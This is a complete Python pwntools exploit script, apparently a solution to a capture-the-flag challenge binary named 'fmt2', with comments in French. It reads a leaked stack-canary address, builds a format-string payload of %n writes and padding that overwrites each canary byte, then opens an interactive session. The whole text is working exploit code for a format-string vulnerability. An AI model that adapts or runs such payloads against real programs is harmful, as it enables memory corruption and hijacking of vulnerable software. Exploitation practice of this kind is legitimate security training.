from pwn import *
import re
import struct

p = process("./fmt2")

canary_address_hex = re.findall(r"We have detected canards at 0x([a-f0-9]{8}). They are the ennemies of the gorfous. Shoot them:", p.recvline().decode())[0]
print(f"[+] Canary address : {canary_address_hex}")

canary_address = int(canary_address_hex, 16)

byte_to_write = 0xab
argument_position_on_stack = 6
wanted_position_on_stack = 14
decalage = 2

payload = f"%{byte_to_write}x%{wanted_position_on_stack}$n%{wanted_position_on_stack+1}$n%{wanted_position_on_stack+2}$n%{wanted_position_on_stack+3}$n".encode()
# on corrige le décalage
payload += b"a" * ((4 - (len(payload) - decalage)%4)%4)
# on pad pour tomber sur la position voulue dans la pile
payload += b"a" * 4 * (wanted_position_on_stack - ((len(payload) - decalage) // 4 + argument_position_on_stack) - 1)
# les addresse des bytes composant le canary
payload += struct.pack("<I", canary_address)
payload += struct.pack("<I", canary_address+1)
payload += struct.pack("<I", canary_address+2)
payload += struct.pack("<I", canary_address+3)

print(f"[+] Payload {payload}")

p.sendline(payload)

p.interactive()

p.close()